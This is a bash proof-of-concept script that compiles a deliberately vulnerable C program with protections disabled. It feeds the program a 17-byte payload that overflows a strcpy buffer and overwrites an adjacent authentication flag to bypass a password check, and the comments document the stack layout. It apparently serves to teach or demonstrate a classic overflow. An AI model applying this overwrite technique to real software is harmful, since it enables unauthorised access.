#!/usr/bin/env bash
# PoC: Stack variable overwrite via strcpy buffer overflow in check_password
# Overflows 16-byte `buffer` to corrupt adjacent `authenticated` int -> auth bypass
#
# Stack layout in check_password (ARM64, clang -O0):
#   sp+0x04..sp+0x13  buffer[16]     (16 bytes)
#   sp+0x14..sp+0x17  authenticated  (int, 4 bytes, little-endian)
#
# strcpy(buffer, input) copies 17 bytes (no bounds check):
#   bytes 0-15  fill buffer[16]
#   byte 16     overwrites authenticated[0] with 'B' (0x42) -> authenticated != 0
#   null term   overwrites authenticated[1] with 0x00
#
# Result: authenticated != 0 -> "Access granted!" printed (auth bypass)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VULN="$SCRIPT_DIR/vuln_nochk"

if [ ! -f "$VULN" ]; then
    echo "[*] Recompiling without fortify source (-D_FORTIFY_SOURCE=0)..."
    gcc -fno-stack-protector -g -D_FORTIFY_SOURCE=0 -O0 \
        -o "$VULN" "$SCRIPT_DIR/vuln.c"
fi

# 16 bytes fill the buffer; 17th byte ('B') overwrites authenticated
PAYLOAD=$(python3 -c "print('A'*16 + 'B')")

PASS=0
for i in 1 2 3; do
    OUT=$("$VULN" "$PAYLOAD" 2>&1)
    echo "Run $i: $OUT"
    if echo "$OUT" | grep -q "Access granted!"; then
        PASS=$((PASS + 1))
    fi
done

echo ""
if [ "$PASS" -eq 3 ]; then
    echo "EXPLOIT CONFIRMED 3/3: stack-variable overwrite bypassed authentication"
    exit 0
else
    echo "EXPLOIT FAILED ($PASS/3 succeeded)"
    exit 1
fi
